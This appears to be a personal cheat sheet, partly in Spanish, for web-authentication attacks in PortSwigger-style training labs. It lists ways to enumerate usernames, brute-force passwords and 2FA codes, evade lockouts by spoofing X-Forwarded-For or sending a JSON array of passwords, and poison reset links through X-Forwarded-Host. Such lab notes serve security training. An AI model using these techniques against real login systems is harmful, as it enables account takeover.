# Authenthication / Brute-Force CHEATSHEET + IMPORTANT LABS

## Key Terms

```bash
X-Forwarded-For  -> bypass ip based brute-force protection
X-Forwarded-Host -> <OUR-SV>
Burp Macros
```

## Most important labs
- [1]()

- [2]()

  <br>

 ## Metodology
<br>


> Brute force users
```
 -> Cluster Bomber Attack -> Grep Extract -> e.g: invalid username/password
      -> ¿username already exists? 
      -> <USERNAME> + <VERY-LONG-PASSWORD> -> show time completed in respose
      -> Sometimes, when attempting to log in as an **existing** user, the server will lock the account after X failed attempts. Create a wordlist that repeats each username 5–10 times 
      -> json? -> try an array of password = brute force in a single request
      -> md5? -> while read -r i; do print  "$i" | md5sum | cut -d ' ' -f1; done < portswigger-password.txt > portswigger-pass-md5sum.txt
```
<br>

> Change password?
```  
  -> Brute-force the current password and in the new password field enter <pass1> <pass2>
      > If the current password is correct, it will show an error message because your new passwords do not match	
```
<br>
    
> Forgot password? 
```
    -> Reuse temporal token 			
	  -> X-Forwarded-Host: <exploit-sv> -> token en nuestro email
```
<br>

Cookie predecible?
```
    -> <username>:<password-hash> base64
    -> <username>:<password+timestamp-hash>
    -> Hash? -> find the type with tools like john-the-ripper,hashid,crackstation(online)...
```
<br>

> 2FA?
```
    -> Intentar evitar la 2º verificación, ej -> 1º login + GET /my-account?username=carlos
    -> login1 (wiener) + login2 (send token to carlos) -> brute force mfa
	  -> macro + brute force mfa
```
<br>

> LOGIN BLOCKED
```
- json? -> try an array of password = brute force en una sola request, eg -> {"username":"carlos","password":["foo1","foo2","foo3..."]} 
- IP based block? -> Pitchforked attack ->  X-Forwarded-For: <IP-INTRUDER+1> + <USERNAME> + <PASSWORD> 
```

